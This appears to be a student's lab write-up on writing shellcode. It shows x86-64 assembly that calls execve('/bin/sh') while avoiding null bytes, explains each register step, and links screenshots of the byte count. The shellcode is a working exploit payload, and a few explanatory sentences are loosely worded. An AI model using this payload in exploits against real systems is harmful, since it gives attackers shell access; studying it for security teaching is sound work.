## ShellCode Creation
# A code block containing your assembly instructions for your shellcode 
```
.text
.global _start
_start:
	movabsq $0x68732f6e69622f2f, %rax /* move 64 bits into rax */
	shr $8, %rax /* remove null terminators by shifting down 8 bits */
	pushq %rax /* push the above -> stack /bin/sh\0 [1st arg] */
	
	/* rdi holds 1st arg of func */
	/* pointer to path to be executed */
	movq %rsp, %rdi /* /bin/sh to rdi */
	
	/* rsi holds 2nd arg of func array of command line args */
	/* array of command line args to pass */
	xorq %rax, %rax /* set to 0 */
	pushq %rax /* push null terminator -> stack */
	pushq %rdi /* push /bin/sh -> stack */
	movq %rsp, %rsi /* point (mov) /bin/sh to rsi */
	
	/* rdx 3rd arg of env var */
	/* no environment variables to pass */
	movq %rax, %rdx /* set to 0 */
	
	addq $0x3b, %rax /* move execve into rax */
	
	syscall
	
	leave
	ret
	
```


# A step-by-step explanation of your assembly code and how it sets up the system call 
To execute : execve (char *pathname, char **argv, char **envp) 

pathname : /bin/sh	|	argv : [ /bin/sh, NULL] 	| 	envp : NULL

execve id = 59 [ 0x3b ]

	RAX | 0x3B
	RDI | bin/sh_addy
	RSI | null_addy
	RDX | null_addy
					
movabsq is used to push the 64 bit 2F 2F 62 69 6e 2F 73 68 00 : "//bin/sh" and saved into the rax register. 

Completing the first argument: To get rid of null termiantors we shifted 8 bits to the right using shr and push that value into rax

Completing the second argument: requires filename associated w/ file, and a NULL pointer. 
rax receives the null and rdi the filename. pointer is then moved to rsi

Completing the third argument:requires the environment variables. Since we are passing nothing we also set this to a null terminator. This is dueable since rax was xorq

addq is then used to put together execve and the arguments that were set up (this is found in the rax register). This will be used to execute the execve when the syscall is done. 


# Report how many bytes total are in your assembly, and include the whole thing in ascii 
![image](https://user-images.githubusercontent.com/89425242/234662767-a9b29b07-8cbc-446d-b976-502687ea6c6b.png)


![image](https://user-images.githubusercontent.com/89425242/234666632-9ab5092c-3aab-43b4-a70a-caeea44bb5c6.png)


